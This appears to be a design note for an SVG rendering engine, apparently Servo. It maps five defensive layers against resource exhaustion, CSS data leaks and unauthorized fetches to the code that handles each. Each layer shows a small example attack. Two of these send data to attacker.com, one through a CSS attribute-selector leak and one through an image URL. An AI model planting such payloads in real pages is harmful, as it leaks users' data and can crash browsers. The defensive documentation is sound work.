# SVG security layers — implementation map

Companion to [`security.md`](security.md) (the design / threat model) and
[`security-issues.md`](security-issues.md) (the issue-by-issue detail). This
doc records, for each of the five defensive layers, **what is already present**
vs **what was implemented**, and **where** the fix lives — file, and library
where relevant.

| Layer | Stage | Attack category | Status |
| --- | --- | --- | --- |
| 1 | Parse | resource exhaustion | XXE/entity already present; depth + element-count caps implemented |
| 2 | Style | data exfiltration | element dispatch + class-only collector already present; `foreignObject` guard implemented |
| 3 | Fetch | unauthorized remote fetch | already present |
| 4 | Build | resource exhaustion | already present |
| 5 | Render | resource exhaustion | already present |

---

## Layer 1 — XML input validation (Parse)

**Category:** resource exhaustion — deep nesting, XXE, entity bombs.

**Example attack**

```svg
<svg><g><g><g> <!-- …100,000 nested <g>… --> </g></g></g></svg>
```

(plus a DOCTYPE carrying an external-entity / "billion laughs" payload)

**Fix**

- **Already present (library — `xml5ever` 0.39):** XXE and entity bombs are
  inert by construction. Named character references resolve only against the
  five static predefined entities (`amp`/`lt`/`gt`/`quot`/`apos`); numeric
  references are bounded to a single code point; a DOCTYPE `SYSTEM`/`PUBLIC`
  id is recorded but never dereferenced.
- **Implemented (Servo):** element-count and nesting-depth caps in the shared
  parser sink, O(1) per node. `MAX_PARSE_ELEMENT_COUNT = 1_000_000`,
  `MAX_PARSE_DEPTH = 512` (matching Chromium/Blink's
  `kMaximumHTMLParserDOMTreeDepth`). Once a limit is hit, further inserts are
  dropped, so the DOM stays bounded and the later *recursive* SVG builder can
  never overflow the native stack.

**Where**

- `components/script/dom/servoparser/mod.rs` — constants + `Sink` guards
  (`element_count`, `depth`, `over_limit`)
- `components/script/dom/servoparser/xml.rs` — sink construction (XML parser)
- `components/script/dom/servoparser/html.rs` — sink construction (HTML parser)
- Library: `xml5ever` (entity handling already safe)

---

## Layer 2 — CSS injection guard (Style)

**Category:** data exfiltration — CSS attribute-selector leak.

**Example attack**

```svg
<svg><style>
  input[value^="a"] { background: url(https://attacker.com/?v=a); }
</style></svg>
```

**Fix**

- **Already present (Servo):** a `<style>` directly inside `<svg>` is created
  as a plain `SVGElement`, not an `HTMLStyleElement` — `create_svg_element`
  has no `style` case and falls through to `_ => make!(SVGElement)`. It is
  therefore never registered as a document stylesheet and never cascades
  document-wide.
- **Already present (Servo):** the only parser that touches SVG `<style>` is
  servo-svg's own collector, which accepts class selectors (`.cls`) and a
  paint-property whitelist only — `input[value^=…]` and `url()` are ignored.
- **Implemented (Servo):** the residual `<svg><foreignObject><style>` path (a
  real `HTMLStyleElement` that *would* cascade document-wide) is now skipped:
  `HTMLStyleElement::update_a_style_block` returns early when
  `layout_servo_svg_enabled` is on and the `<style>` sits inside an SVG subtree.

**Where**

- `components/script/dom/html/document_metadata/htmlstyleelement.rs` — guard +
  `is_in_svg_subtree()` helper
- `components/script/dom/element/create.rs` — namespace → element dispatch
- `components/layout/svg/primitives/css.rs` — restricted class-only collector

---

## Layer 3 — Fetch allowlist (Fetch)

**Category:** unauthorized remote fetch.

**Example attack**

```svg
<!-- blocked by: Content-Security-Policy: img-src 'self' -->
<svg><image href="https://attacker.com/collect?d=SECRET" width="1" height="1"/></svg>
```

**Fix**

- **Already present (Servo):** `<image>` / `feImage` fetches reuse Servo's
  CSP-aware image path — `ImageResolver::get_cached_image_for_url` → image
  cache → net thread with `Destination::Image` + policy container. A URL the
  document's CSP does not allow is dropped before the request leaves the
  process, so no fetch can leak data.

**Where**

- `components/layout/context.rs` — `ImageResolver::get_cached_image_for_url`
- `components/net/http_loader.rs` — `Destination::Image` + `.policy_container(...)`
- Library: Servo net stack (CSP enforcement)

---

## Layer 4 — Expansion & geometry limits (Build)

**Category:** resource exhaustion — `<use>` recursion, extreme values.

**Example attack**

```svg
<svg><g id="l1"><use href="#l2"/></g><g id="l2"><use href="#l1"/></g></svg>
```

(also extreme `viewBox`, path, points, stroke, and filter values)

**Fix**

- **Already present (Servo):** `<use>` resolution is bounded by
  `MAX_USE_DEPTH = 64` and `MAX_TOTAL_NODES = 1_000_000`, which caps
  exponential fan-out and mutual recursion; individual geometry values are
  clamped in `limits.rs`.

**Where**

- `components/layout/svg/builder/resolve.rs` — `MAX_USE_DEPTH`, `MAX_TOTAL_NODES`
- `components/layout/svg/builder/mod.rs` — node budget enforcement
- `components/layout/svg/limits.rs` — `MAX_VIEWPORT_DIMENSION`,
  `MAX_PATH_SEGMENTS`, `MAX_POINTS`, `MAX_STROKE_WIDTH`, `MAX_MITER_LIMIT`,
  `MAX_DASH_COUNT`, `MAX_DASH_LENGTH`, `MAX_STD_DEVIATION`

---

## Layer 5 — Render safety guard (Render)

**Category:** resource exhaustion — self-referencing paint servers / masks.

**Example attack**

```svg
<svg><pattern id="p" width="10" height="10"><rect width="10" height="10" fill="url(#p)"/></pattern>
<rect width="100" height="100" fill="url(#p)"/></svg>
```

**Fix**

- **Already present (Servo):** paint-server reference depth is capped by
  `MAX_PAINT_SERVER_DEPTH`, so a self-referencing `<pattern>` (or transitively
  referencing one) terminates instead of recursing until stack overflow. A
  similar `MAX_MASK_DEPTH` caps nested `<mask>` resolution.

**Where**

- `components/svg/render/renderer/render_trait.rs` — `MAX_PAINT_SERVER_DEPTH` + `def_depth`
- `components/svg/render/renderer/fill.rs`, `components/svg/render/renderer/pattern.rs` — depth check
- `components/svg/render/effects/mask.rs` — `MAX_MASK_DEPTH`

---

## Summary — implemented vs already present

| Layer | Already present | Implemented |
| --- | --- | --- |
| 1 — Parse | XXE / entity-bomb immunity (`xml5ever`) | element-count + depth caps (`servoparser`) |
| 2 — Style | `<style>`→`SVGElement` dispatch; class-only collector | `foreignObject` `<style>` registration skip |
| 3 — Fetch | CSP-aware image fetch path | — |
| 4 — Build | `<use>` depth/fan-out budget; value clamps | — |
| 5 — Render | paint-server / mask depth caps | — |

## Tests

Each layer is exercised by a dedicated page under
`D:\Projects\svg-tests\security\` (one file per scenario; see that folder's
README for the run command). Standalone `.svg` files there exercise the XML
parser sink; `.html` files with inline SVG exercise the HTML parser sink.
